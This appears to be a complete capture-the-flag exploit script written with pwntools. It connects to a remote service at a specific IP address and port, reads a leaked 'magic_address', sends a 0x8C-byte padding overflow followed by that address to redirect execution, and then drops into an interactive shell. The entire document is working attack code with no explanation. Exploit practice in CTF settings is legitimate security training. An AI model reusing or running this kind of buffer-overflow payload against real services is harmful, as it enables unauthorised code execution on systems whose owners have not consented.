from pwn import*
p = process('./main')
p = remote('39.101.210.214',10008)
p.recvuntil('magic_address ')
shell = int(p.recv(10),16)
log.info('Shell:\t' + hex(shell))
p.send('\x00'*0x8C + p32(shell))
p.interactive()
